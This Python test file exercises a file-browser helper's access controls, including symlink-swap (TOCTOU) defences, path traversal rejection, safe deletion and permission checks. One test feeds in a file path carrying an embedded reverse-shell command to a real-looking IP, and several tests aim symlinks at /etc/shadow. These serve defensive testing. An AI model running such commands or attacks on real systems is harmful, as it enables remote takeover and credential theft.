#  Copyright Amazon.com, Inc. or its affiliates. All Rights Reserved.
#
#  Licensed under the Apache License, Version 2.0 (the "License"). You may not use this file except in compliance
#  with the License. A copy of the License is located at
#
#      http://www.apache.org/licenses/LICENSE-2.0
#
#  or in the 'license' file accompanying this file. This file is distributed on an 'AS IS' BASIS, WITHOUT WARRANTIES
#  OR CONDITIONS OF ANY KIND, express or implied. See the License for the specific language governing permissions
#  and limitations under the License.

"""
Test Cases for FileSystemHelper
"""

import errno
import os
import pathlib
import unittest.mock as mock
from subprocess import CompletedProcess

import pytest
from ideasdk.filesystem.filesystem_helper import FileSystemHelper
from ideasdk.shell import ShellInvocationResult, ShellInvoker
from ideasdk.utils import Utils

from ideadatamodel import (
    CreateFileRequest,
    DeleteFilesRequest,
    DownloadFilesRequest,
    ListFilesRequest,
    ReadFileRequest,
    SaveFileRequest,
    TailFileRequest,
    errorcodes,
    exceptions,
)


class MockShellInvoker:
    def __init__(self, test_case: str):
        self.test_case = test_case

    def list_files(self):
        return ShellInvocationResult(
            command="",
            result=CompletedProcess(
                args="ls",
                returncode=0,
                stdout="""internal
bin
boot
dev
etc
home
lib
lib64
local
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var""",
                stderr=None,
            ),
            total_time_ms=1,
        )

    def invoke(self, *args, **_) -> ShellInvocationResult:
        command = args[0]

        if command[3].startswith("test"):
            return ShellInvocationResult(
                command="",
                result=CompletedProcess(
                    args="test", returncode=0, stdout="", stderr=None
                ),
                total_time_ms=10,
            )
        elif self.test_case == "list-root-dir":
            return self.list_files()


@pytest.fixture()
def file_system_helper(request, context, monkeypatch):
    username = "mockuser"

    stat = os.stat_result((0, 0, 0, 0, 0, 0, 0, 0, 0, 0))
    monkeypatch.setattr(os, "stat", lambda *_, **__: stat)
    monkeypatch.setattr(os, "lstat", lambda *_, **__: stat)

    helper = FileSystemHelper(
        context=context,
        username=username,
    )
    helper.shell = MockShellInvoker(request.param[0])
    return helper


@pytest.mark.parametrize("file_system_helper", [["list-root-dir"]], indirect=True)
def test_file_browser_list_files_root_directory(
    context, file_system_helper, monkeypatch
):
    """
    list files in root directory and ensure only internal and home directories can be listed
    """
    monkeypatch.setattr(FileSystemHelper, "is_file_browser_enabled", lambda *_: True)
    result = file_system_helper.list_files(ListFilesRequest(cwd="/"))

    for file_data in result.listing:
        assert file_data.name in ("mnt", "internal", "home")


@pytest.mark.parametrize(
    "file_system_helper", [["read-restricted-file"]], indirect=True
)
def test_file_browser_read_file_restricted_access(
    context, file_system_helper, monkeypatch
):
    """
    try to read a file in restricted directories and unauthorized access exception should be thrown
    """
    monkeypatch.setattr(FileSystemHelper, "is_file_browser_enabled", lambda *_: True)

    monkeypatch.setattr(Utils, "is_file", lambda *_: True)
    monkeypatch.setattr(Utils, "is_binary_file", lambda *_: False)

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.read_file(ReadFileRequest(file="/etc/shadow"))
    assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS


@pytest.mark.parametrize("file_system_helper", [["check-access"]], indirect=True)
def test_file_browser_check_access_invalid_path_unauthorized_access(
    context, file_system_helper, monkeypatch
):
    """
    try to read a file in restricted directories and unauthorized access exception should be thrown
    """
    monkeypatch.setattr(FileSystemHelper, "is_file_browser_enabled", lambda *_: True)
    monkeypatch.setattr(pathlib.Path, "exists", lambda *_: False)
    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.check_access(
            file='/"`bash -i >& /dev/tcp/54.214.65.93/3377 0>&1`\\'
        )
    assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS


@pytest.mark.parametrize(
    "file_system_helper", [["disabled-filebrowser"]], indirect=True
)
@pytest.mark.parametrize(
    "cwd,file,filename,content",
    [("/home/admin1/Desktop/", "/home/admin1/Desktop/file1", "file1", "%CONTENT%")],
)
def test_file_browser_disabled_success(
    context, file_system_helper, cwd, file, filename, content, monkeypatch
):
    """
    try to use file browser when disabled and disabled feature exception should be thrown
    """
    monkeypatch.setattr(FileSystemHelper, "is_file_browser_enabled", lambda *_: False)

    monkeypatch.setattr(Utils, "is_file", lambda *_: True)
    monkeypatch.setattr(Utils, "is_binary_file", lambda *_: False)

    monkeypatch.setattr(Utils, "is_dir", lambda *_: True)

    monkeypatch.setattr(FileSystemHelper, "get_user_home", lambda *_: "/home/admin1/")

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.list_files(ListFilesRequest(cwd=cwd))
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.read_file(ReadFileRequest(file=file))
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.tail_file(TailFileRequest(file=file))
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.save_file(SaveFileRequest(file=cwd, content=content))
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.download_files(DownloadFilesRequest(files=[file]))
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.create_file(
            CreateFileRequest(cwd=cwd, filename=filename, is_folder=False)
        )
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE

    with pytest.raises(exceptions.SocaException) as exc_info:
        file_system_helper.delete_files(DeleteFilesRequest(files=[file]))
    assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE


# ============================================================
# Tests for safe_open helper (TOCTOU fix)
# ============================================================

import shutil
import tempfile


@pytest.fixture
def safe_open_helper(context):
    """Create a FileSystemHelper with a real temp directory as user home."""
    tmp_dir = tempfile.mkdtemp()
    user_home = os.path.join(tmp_dir, "testuser")
    os.makedirs(user_home)

    helper = FileSystemHelper(context=context, username="testuser")
    # Override get_user_home to use our temp directory
    helper.get_user_home = lambda: user_home
    helper._user_home = user_home

    yield helper, user_home

    shutil.rmtree(tmp_dir, ignore_errors=True)


class TestSafeOpen:
    """Unit tests for the safe_open helper method."""

    def test_safe_open_allows_normal_file_access(self, safe_open_helper):
        """safe_open allows reading a normal file within user's home directory."""
        helper, user_home = safe_open_helper
        test_file = os.path.join(user_home, "normal.txt")
        with open(test_file, "w") as f:
            f.write("hello world")

        with helper.safe_open(test_file, "r") as f:
            content = f.read()
        assert content == "hello world"

    def test_safe_open_allows_nested_file_access(self, safe_open_helper):
        """safe_open allows reading a file in a subdirectory within user's home."""
        helper, user_home = safe_open_helper
        subdir = os.path.join(user_home, "subdir")
        os.makedirs(subdir)
        test_file = os.path.join(subdir, "nested.txt")
        with open(test_file, "w") as f:
            f.write("nested content")

        with helper.safe_open(test_file, "r") as f:
            content = f.read()
        assert content == "nested content"

    def test_safe_open_rejects_symlink_on_final_component(
        self, safe_open_helper, monkeypatch
    ):
        """Layer 3 rejects symlink swapped in after realpath (TOCTOU scenario)."""
        helper, user_home = safe_open_helper

        # Symlink pointing outside user home (attacker swap)
        symlink = os.path.join(user_home, "link.txt")
        os.symlink("/etc/passwd", symlink)

        # Simulate TOCTOU: realpath saw a regular file before the swap
        monkeypatch.setattr(os.path, "realpath", lambda p: p)

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open(symlink, "r")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_safe_open_rejects_symlink_on_intermediate_directory(
        self, safe_open_helper, monkeypatch
    ):
        """Layer 2 rejects symlink directory swapped in after realpath (TOCTOU scenario)."""
        helper, user_home = safe_open_helper

        # Create a symlink directory pointing outside user home
        symlink_dir = os.path.join(user_home, "linkdir")
        os.symlink("/etc", symlink_dir)

        # Simulate TOCTOU: realpath saw a real directory before the swap
        monkeypatch.setattr(os.path, "realpath", lambda p: p)

        symlink_path = os.path.join(symlink_dir, "passwd")
        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open(symlink_path, "r")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_safe_open_rejects_path_outside_user_home(self, safe_open_helper):
        """safe_open rejects paths that resolve outside the user's home directory."""
        helper, user_home = safe_open_helper
        # Create a file outside user home
        outside_file = os.path.join(os.path.dirname(user_home), "outside.txt")
        with open(outside_file, "w") as f:
            f.write("outside data")

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open(outside_file, "r")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_safe_open_rejects_path_traversal(self, safe_open_helper):
        """safe_open rejects path traversal attempts (../)."""
        helper, user_home = safe_open_helper
        # realpath resolves ../  so this should resolve outside user home
        traversal_path = os.path.join(user_home, "..", "outside.txt")
        outside_file = os.path.realpath(traversal_path)
        # Create the target file
        with open(outside_file, "w") as f:
            f.write("traversal target")

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open(traversal_path, "r")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_safe_open_allows_write_mode(self, safe_open_helper):
        """safe_open allows writing a file within user's home directory."""
        helper, user_home = safe_open_helper
        test_file = os.path.join(user_home, "writable.txt")

        with helper.safe_open(test_file, "w") as f:
            f.write("written content")

        with open(test_file, "r") as f:
            assert f.read() == "written content"

    def test_safe_open_rejects_symlink_to_outside_on_write(self, safe_open_helper):
        """safe_open rejects writing via a symlink pointing outside user home."""
        helper, user_home = safe_open_helper
        outside_file = os.path.join(os.path.dirname(user_home), "target.txt")
        symlink = os.path.join(user_home, "evil_link.txt")
        os.symlink(outside_file, symlink)

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open(symlink, "w")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_safe_open_propagates_file_not_found(self, safe_open_helper):
        """safe_open raises OSError (not unauthorized_access) for non-existent files."""
        helper, user_home = safe_open_helper
        missing_file = os.path.join(user_home, "does_not_exist.txt")

        with pytest.raises(OSError) as exc_info:
            helper.safe_open(missing_file, "r")
        assert exc_info.value.errno == errno.ENOENT


class TestSafeChownDir:
    """Test that safe_chown_dir refuses to follow symlinks."""

    @pytest.fixture
    def helper_with_dir(self, context):
        tmp_dir = tempfile.mkdtemp()
        user_home = os.path.join(tmp_dir, "testuser")
        os.makedirs(user_home)
        helper = FileSystemHelper(context=context, username="testuser")
        helper.get_user_home = lambda: user_home
        yield helper, user_home, tmp_dir
        shutil.rmtree(tmp_dir, ignore_errors=True)

    def test_chowns_real_directory(self, helper_with_dir):
        """safe_chown_dir succeeds on a real directory."""
        helper, user_home, _ = helper_with_dir
        target_dir = os.path.join(user_home, "real_dir")
        os.makedirs(target_dir)

        uid = os.getuid()
        gid = os.getgid()
        # Should not raise
        helper.safe_chown_dir(target_dir, uid, gid)

    def test_rejects_symlink(self, helper_with_dir):
        """safe_chown_dir raises on a symlink pointing to a directory."""
        helper, user_home, tmp_dir = helper_with_dir
        target_dir = os.path.join(tmp_dir, "victim_home")
        os.makedirs(target_dir)
        symlink_dir = os.path.join(user_home, "evil_link")
        os.symlink(target_dir, symlink_dir)

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_chown_dir(symlink_dir, os.getuid(), os.getgid())
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_rejects_nonexistent_path(self, helper_with_dir):
        """safe_chown_dir raises OSError on a path that doesn't exist."""
        helper, user_home, _ = helper_with_dir
        missing = os.path.join(user_home, "does_not_exist")

        with pytest.raises(OSError):
            helper.safe_chown_dir(missing, os.getuid(), os.getgid())


class TestSafeDelete:
    """Test that safe_delete_file and safe_delete_dir refuse symlink-in-parent attacks."""

    @pytest.fixture
    def helper_with_dir(self, context):
        tmp_dir = tempfile.mkdtemp()
        user_home = os.path.join(tmp_dir, "testuser")
        os.makedirs(user_home)
        helper = FileSystemHelper(context=context, username="testuser")
        helper.get_user_home = lambda: user_home
        yield helper, user_home, tmp_dir
        shutil.rmtree(tmp_dir, ignore_errors=True)

    def test_safe_delete_file_succeeds(self, helper_with_dir):
        """safe_delete_file deletes a real file within user's home."""
        helper, user_home, _ = helper_with_dir
        target = os.path.join(user_home, "myfile.txt")
        with open(target, "w") as f:
            f.write("data")

        helper.safe_delete_file(target)

        assert not os.path.exists(target)

    def test_safe_delete_file_rejects_symlink_parent(self, helper_with_dir):
        """safe_delete_file raises when an intermediate directory is a symlink."""
        helper, user_home, tmp_dir = helper_with_dir
        victim_dir = os.path.join(tmp_dir, "victim")
        os.makedirs(victim_dir)
        victim_file = os.path.join(victim_dir, "secret.txt")
        with open(victim_file, "w") as f:
            f.write("secret")

        # Create symlink inside user home pointing to victim dir
        symlink_dir = os.path.join(user_home, "evil")
        os.symlink(victim_dir, symlink_dir)

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_delete_file(os.path.join(symlink_dir, "secret.txt"))
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

        # Victim file should still exist
        assert os.path.exists(victim_file)

    def test_safe_delete_file_rejects_path_outside_home(self, helper_with_dir):
        """safe_delete_file raises when resolved path is outside user home."""
        helper, user_home, tmp_dir = helper_with_dir
        outside_file = os.path.join(tmp_dir, "outside.txt")
        with open(outside_file, "w") as f:
            f.write("data")

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_delete_file(outside_file)
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_safe_delete_dir_succeeds(self, helper_with_dir):
        """safe_delete_dir deletes a real directory within user's home."""
        helper, user_home, _ = helper_with_dir
        target = os.path.join(user_home, "mydir")
        os.makedirs(target)
        with open(os.path.join(target, "file.txt"), "w") as f:
            f.write("data")

        helper.safe_delete_dir(target)

        assert not os.path.exists(target)

    def test_safe_delete_dir_rejects_symlink_parent(self, helper_with_dir):
        """safe_delete_dir raises when an intermediate directory is a symlink."""
        helper, user_home, tmp_dir = helper_with_dir
        victim_dir = os.path.join(tmp_dir, "victim_home")
        os.makedirs(victim_dir)
        with open(os.path.join(victim_dir, "data.txt"), "w") as f:
            f.write("victim data")

        symlink_dir = os.path.join(user_home, "evil")
        os.symlink(tmp_dir, symlink_dir)

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_delete_dir(os.path.join(symlink_dir, "victim_home"))
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

        # Victim dir should still exist
        assert os.path.exists(victim_dir)

    def test_safe_delete_dir_rejects_symlink_target(self, helper_with_dir):
        """safe_delete_dir raises when the target directory itself is a symlink."""
        helper, user_home, tmp_dir = helper_with_dir
        real_dir = os.path.join(tmp_dir, "real_target")
        os.makedirs(real_dir)
        symlink = os.path.join(user_home, "link_to_dir")
        os.symlink(real_dir, symlink)

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_delete_dir(symlink)
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

        # Real dir should still exist
        assert os.path.exists(real_dir)

    def test_safe_delete_dir_with_symlink_inside(self, helper_with_dir):
        """safe_delete_dir removes a dir containing a symlink without following it."""
        helper, user_home, tmp_dir = helper_with_dir
        target = os.path.join(user_home, "mydir")
        os.makedirs(os.path.join(target, "realsubdir"))
        open(os.path.join(target, "realsubdir", "file.txt"), "w").close()

        # Create a symlink-to-directory inside the target
        outside_dir = os.path.join(tmp_dir, "outside")
        os.makedirs(outside_dir)
        open(os.path.join(outside_dir, "precious.txt"), "w").close()
        os.symlink(outside_dir, os.path.join(target, "symlinked_dir"))

        helper.safe_delete_dir(target)

        # Target is deleted
        assert not os.path.exists(target)
        # Outside dir was NOT followed/deleted
        assert os.path.exists(outside_dir)
        assert os.path.exists(os.path.join(outside_dir, "precious.txt"))

    def test_safe_delete_symlink_removes_link_not_target(self, helper_with_dir):
        """safe_delete_symlink removes the symlink itself, not the target."""
        helper, user_home, _ = helper_with_dir
        target_file = os.path.join(user_home, "real_file.txt")
        with open(target_file, "w") as f:
            f.write("important data")
        symlink = os.path.join(user_home, "mylink")
        os.symlink(target_file, symlink)

        helper.safe_delete_symlink(symlink)

        assert not os.path.islink(symlink)
        assert os.path.exists(target_file)  # target preserved

    def test_safe_delete_symlink_pointing_outside_home(self, helper_with_dir):
        """safe_delete_symlink can delete a symlink whose target is outside user home."""
        helper, user_home, tmp_dir = helper_with_dir
        outside_file = os.path.join(tmp_dir, "outside.txt")
        with open(outside_file, "w") as f:
            f.write("external data")
        symlink = os.path.join(user_home, "link_to_outside")
        os.symlink(outside_file, symlink)

        helper.safe_delete_symlink(symlink)

        assert not os.path.islink(symlink)
        assert os.path.exists(outside_file)  # target preserved

    def test_safe_delete_symlink_rejects_symlink_in_parent(self, helper_with_dir):
        """safe_delete_symlink raises when parent path contains a symlink."""
        helper, user_home, tmp_dir = helper_with_dir
        victim_dir = os.path.join(tmp_dir, "victim")
        os.makedirs(victim_dir)
        victim_link = os.path.join(victim_dir, "link")
        os.symlink("/dev/null", victim_link)

        # Create symlink parent inside user home pointing to victim dir
        evil_parent = os.path.join(user_home, "evil")
        os.symlink(victim_dir, evil_parent)

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_delete_symlink(os.path.join(evil_parent, "link"))
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

        # Victim's symlink should still exist
        assert os.path.islink(victim_link)


class TestListFilesLstat:
    """Test that list_files uses lstat (does not follow symlinks for metadata)."""

    def test_list_files_skips_symlinks(self, context, monkeypatch):
        """list_files skips symlink entries entirely."""
        tmp_dir = tempfile.mkdtemp()
        user_home = os.path.join(tmp_dir, "testuser")
        os.makedirs(user_home)

        # Create a regular file and a symlink
        regular = os.path.join(user_home, "regular.txt")
        with open(regular, "w") as f:
            f.write("data")
        symlink = os.path.join(user_home, "link.txt")
        os.symlink("/etc/shadow", symlink)

        helper = FileSystemHelper(context=context, username="testuser")
        helper.get_user_home = lambda: user_home
        helper.shell = type(
            "MockShell",
            (),
            {
                "invoke": lambda *a, **k: ShellInvocationResult(
                    command="",
                    result=CompletedProcess(
                        args="ls",
                        returncode=0,
                        stdout="regular.txt\nlink.txt",
                        stderr=None,
                    ),
                    total_time_ms=1,
                )
            },
        )()
        monkeypatch.setattr(
            FileSystemHelper, "is_file_browser_enabled", lambda *_: True
        )
        monkeypatch.setattr(FileSystemHelper, "check_access", lambda *a, **k: None)

        result = helper.list_files(ListFilesRequest(cwd=user_home))

        file_names = [f.name for f in result.listing]
        assert "regular.txt" in file_names
        assert "link.txt" not in file_names

        shutil.rmtree(tmp_dir, ignore_errors=True)


class TestAPIsUseSafeOpen:
    """Verify that FileBrowser API methods use safe_open instead of direct open()."""

    def test_read_file_uses_safe_open(self, context, monkeypatch):
        """read_file calls safe_open, not open()."""
        helper = FileSystemHelper(context=context, username="testuser")
        monkeypatch.setattr(
            FileSystemHelper, "is_file_browser_enabled", lambda *_: True
        )
        monkeypatch.setattr(
            FileSystemHelper, "get_user_home", lambda *_: "/home/testuser"
        )
        monkeypatch.setattr(FileSystemHelper, "check_access", lambda *a, **k: None)
        monkeypatch.setattr(Utils, "is_file", lambda *_: True)
        monkeypatch.setattr(Utils, "is_binary_file", lambda *_: False)

        safe_open_called = []
        original_safe_open = helper.safe_open

        def mock_safe_open(file, mode):
            safe_open_called.append((file, mode))
            from io import StringIO

            return StringIO("test content")

        monkeypatch.setattr(helper, "safe_open", mock_safe_open)

        result = helper.read_file(ReadFileRequest(file="/home/testuser/test.txt"))
        assert len(safe_open_called) == 1
        assert safe_open_called[0] == ("/home/testuser/test.txt", "r")

    def test_save_file_uses_safe_open(self, context, monkeypatch):
        """save_file calls safe_open, not open()."""
        helper = FileSystemHelper(context=context, username="testuser")
        monkeypatch.setattr(
            FileSystemHelper, "is_file_browser_enabled", lambda *_: True
        )
        monkeypatch.setattr(
            FileSystemHelper, "get_user_home", lambda *_: "/home/testuser"
        )
        monkeypatch.setattr(FileSystemHelper, "check_access", lambda *a, **k: None)
        monkeypatch.setattr(Utils, "is_file", lambda *_: True)
        monkeypatch.setattr(Utils, "is_binary_file", lambda *_: False)
        monkeypatch.setattr(Utils, "base64_decode", lambda *_: "content")

        safe_open_called = []

        def mock_safe_open(file, mode):
            safe_open_called.append((file, mode))
            from io import StringIO

            return StringIO()

        monkeypatch.setattr(helper, "safe_open", mock_safe_open)

        helper.save_file(
            SaveFileRequest(file="/home/testuser/test.txt", content="Y29udGVudA==")
        )
        assert len(safe_open_called) == 1
        assert safe_open_called[0] == ("/home/testuser/test.txt", "w")

    def test_download_files_uses_safe_open(self, context, monkeypatch):
        """download_files calls safe_open for each file, not ZipFile.write()."""
        helper = FileSystemHelper(context=context, username="testuser")
        monkeypatch.setattr(
            FileSystemHelper, "is_file_browser_enabled", lambda *_: True
        )
        monkeypatch.setattr(
            FileSystemHelper, "get_user_home", lambda *_: "/home/testuser"
        )
        monkeypatch.setattr(FileSystemHelper, "check_access", lambda *a, **k: None)
        monkeypatch.setattr(Utils, "is_file", lambda *_: True)
        monkeypatch.setattr(Utils, "is_dir", lambda *_: True)
        monkeypatch.setattr(Utils, "is_symlink", lambda *_: False)
        monkeypatch.setattr(os, "makedirs", lambda *a, **k: None)
        monkeypatch.setattr(helper, "safe_chown_dir", lambda *a, **k: None)
        monkeypatch.setattr(shutil, "chown", lambda *a, **k: None)
        monkeypatch.setattr(FileSystemHelper, "get_primary_group_id", lambda *_: 1000)
        monkeypatch.setattr(Utils, "short_uuid", lambda: "abc123")
        monkeypatch.setattr(
            "ideasdk.filesystem.filesystem_helper.getpwnam",
            lambda _: type("pw", (), {"pw_uid": 1000})(),
        )

        safe_open_called = []

        def mock_safe_open(file, mode):
            safe_open_called.append((file, mode))
            from io import BytesIO
            from unittest.mock import MagicMock

            if mode == "rb":
                mock_file = MagicMock(wraps=BytesIO(b"file content"))
                mock_file.fileno.return_value = 99
                mock_file.__enter__ = lambda s: s
                mock_file.__exit__ = lambda s, *a: None
                return mock_file
            return BytesIO(b"file content")

        monkeypatch.setattr(helper, "safe_open", mock_safe_open)
        monkeypatch.setattr(os, "fchown", lambda *a: None)

        # Mock ZipFile to avoid actual file creation
        from unittest.mock import MagicMock, patch

        mock_zipfile = MagicMock()
        with patch(
            "ideasdk.filesystem.filesystem_helper.ZipFile", return_value=mock_zipfile
        ):
            mock_zipfile.__enter__ = lambda s: s
            mock_zipfile.__exit__ = lambda s, *a: None
            helper.download_files(
                DownloadFilesRequest(files=["/home/testuser/file1.txt"])
            )

        assert len(safe_open_called) == 2
        assert safe_open_called[0] == ("/home/testuser/file1.txt", "rb")
        # Second call is safe_open on the zip file for fchown
        assert safe_open_called[1] == ("/home/testuser/idea_downloads/abc123.zip", "rb")


class TestSafeOpenWithProjectScope:
    """Test that safe_open_with_project_scope prevents symlink attacks and enforces permissions."""

    @pytest.fixture
    def helper_with_mounts(self, context, monkeypatch):
        tmp_dir = tempfile.mkdtemp()
        user_home = os.path.join(tmp_dir, "home", "testuser")
        home_mount = os.path.join(tmp_dir, "home")
        project_mount = os.path.join(tmp_dir, "projects")
        os.makedirs(user_home)
        os.makedirs(project_mount)

        helper = FileSystemHelper(context=context, username="testuser")
        helper.get_user_home = lambda: user_home
        monkeypatch.setattr(
            FileSystemHelper, "is_file_browser_enabled", lambda *_: True
        )

        # Mock _get_allowed_mount_dirs to return our test mounts
        helper._get_allowed_mount_dirs = lambda: [
            os.path.realpath(home_mount),
            os.path.realpath(project_mount),
        ]

        yield helper, user_home, home_mount, project_mount, tmp_dir
        shutil.rmtree(tmp_dir, ignore_errors=True)

    def test_opens_file_in_user_home(self, helper_with_mounts):
        """Successfully opens a regular file within user's home."""
        helper, user_home, _, _, _ = helper_with_mounts
        test_file = os.path.join(user_home, "myfile.txt")
        with open(test_file, "w") as f:
            f.write("hello")
        # Make readable by current user (simulating owner read)
        os.chmod(test_file, 0o644)

        # Mock getpwnam and getgrouplist for the permission check
        uid = os.stat(test_file).st_uid
        gid = os.stat(test_file).st_gid

        with (
            mock.patch("ideasdk.filesystem.filesystem_helper.getpwnam") as mock_pwnam,
            mock.patch("os.getgrouplist") as mock_groups,
        ):
            mock_pwnam.return_value = mock.Mock(pw_uid=uid, pw_gid=gid)
            mock_groups.return_value = [gid]
            result = helper.safe_open_with_project_scope(test_file, "rb")
            content = result.read()
            result.close()
        assert content == b"hello"

    def test_opens_file_in_project_mount(self, helper_with_mounts):
        """Successfully opens a regular file within a project filesystem mount."""
        helper, _, _, project_mount, _ = helper_with_mounts
        test_file = os.path.join(project_mount, "data.csv")
        with open(test_file, "w") as f:
            f.write("col1,col2")
        os.chmod(test_file, 0o644)

        uid = os.stat(test_file).st_uid
        gid = os.stat(test_file).st_gid

        with (
            mock.patch("ideasdk.filesystem.filesystem_helper.getpwnam") as mock_pwnam,
            mock.patch("os.getgrouplist") as mock_groups,
        ):
            mock_pwnam.return_value = mock.Mock(pw_uid=uid, pw_gid=gid)
            mock_groups.return_value = [gid]
            result = helper.safe_open_with_project_scope(test_file, "rb")
            content = result.read()
            result.close()
        assert content == b"col1,col2"

    def test_rejects_symlink_to_etc_shadow(self, helper_with_mounts):
        """Rejects a symlink pointing outside allowed bases (e.g., /etc/shadow)."""
        helper, user_home, _, _, _ = helper_with_mounts
        symlink_path = os.path.join(user_home, "evil_link")
        os.symlink("/etc/shadow", symlink_path)

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open_with_project_scope(symlink_path, "rb")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_rejects_symlink_in_intermediate_directory(self, helper_with_mounts):
        """Rejects a path where an intermediate component is a symlink."""
        helper, user_home, _, _, tmp_dir = helper_with_mounts
        # Create a legitimate-looking directory structure
        real_dir = os.path.join(user_home, "realdir")
        os.makedirs(real_dir)
        decoy_file = os.path.join(real_dir, "shadow")
        with open(decoy_file, "w") as f:
            f.write("decoy")

        # Create a symlink component pointing outside
        evil_dir = os.path.join(user_home, "sub")
        os.symlink("/etc", evil_dir)

        # The resolved path /etc/shadow is outside allowed bases
        target_path = os.path.join(user_home, "sub", "shadow")
        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open_with_project_scope(target_path, "rb")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_rejects_path_outside_all_mounts(self, helper_with_mounts):
        """Rejects a path that resolves outside any allowed mount directory."""
        helper, _, _, _, _ = helper_with_mounts

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open_with_project_scope("/etc/passwd", "rb")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_rejects_dotdot_in_path(self, helper_with_mounts):
        """Rejects paths containing '..' traversal."""
        helper, user_home, _, _, _ = helper_with_mounts

        traversal_path = os.path.join(user_home, "..", "..", "etc", "shadow")
        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open_with_project_scope(traversal_path, "rb")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_allows_filename_with_double_dots(self, helper_with_mounts):
        """Does not reject legitimate filenames containing '..' as a substring."""
        helper, user_home, _, _, _ = helper_with_mounts
        test_file = os.path.join(user_home, "file..backup.txt")
        with open(test_file, "w") as f:
            f.write("backup data")
        os.chmod(test_file, 0o644)

        uid = os.stat(test_file).st_uid
        gid = os.stat(test_file).st_gid

        with (
            mock.patch("ideasdk.filesystem.filesystem_helper.getpwnam") as mock_pwnam,
            mock.patch("os.getgrouplist") as mock_groups,
        ):
            mock_pwnam.return_value = mock.Mock(pw_uid=uid, pw_gid=gid)
            mock_groups.return_value = [gid]
            result = helper.safe_open_with_project_scope(test_file, "rb")
            content = result.read()
            result.close()
        assert content == b"backup data"

    def test_rejects_empty_path(self, helper_with_mounts):
        """Rejects empty file path."""
        helper, _, _, _, _ = helper_with_mounts

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open_with_project_scope("", "rb")
        assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_rejects_when_file_browser_disabled(self, context, monkeypatch):
        """Raises disabled feature when file browser is off."""
        tmp_dir = tempfile.mkdtemp()
        user_home = os.path.join(tmp_dir, "testuser")
        os.makedirs(user_home)
        helper = FileSystemHelper(context=context, username="testuser")
        helper.get_user_home = lambda: user_home
        monkeypatch.setattr(
            FileSystemHelper, "is_file_browser_enabled", lambda *_: False
        )

        test_file = os.path.join(user_home, "file.txt")
        with open(test_file, "w") as f:
            f.write("data")

        with pytest.raises(exceptions.SocaException) as exc_info:
            helper.safe_open_with_project_scope(test_file, "rb")
        assert exc_info.value.error_code == errorcodes.DISABLED_FEATURE
        shutil.rmtree(tmp_dir, ignore_errors=True)

    def test_rejects_when_user_lacks_read_permission(self, helper_with_mounts):
        """Rejects when the requesting user does not have POSIX read permission."""
        helper, user_home, _, _, _ = helper_with_mounts
        test_file = os.path.join(user_home, "secret.txt")
        with open(test_file, "w") as f:
            f.write("secret")
        os.chmod(test_file, 0o644)

        # Mock the user as someone who is NOT the owner and NOT in the group

        with (
            mock.patch("ideasdk.filesystem.filesystem_helper.getpwnam") as mock_pwnam,
            mock.patch("os.getgrouplist") as mock_groups,
        ):
            # Use a different uid/gid that doesn't match the file
            mock_pwnam.return_value = mock.Mock(pw_uid=99999, pw_gid=99999)
            mock_groups.return_value = [99999]
            # File is 0o644, so 'other' has read — change to 0o640 to block
            os.chmod(test_file, 0o640)
            with pytest.raises(exceptions.SocaException) as exc_info:
                helper.safe_open_with_project_scope(test_file, "rb")
            assert exc_info.value.error_code == errorcodes.UNAUTHORIZED_ACCESS

    def test_allows_group_read_permission(self, helper_with_mounts):
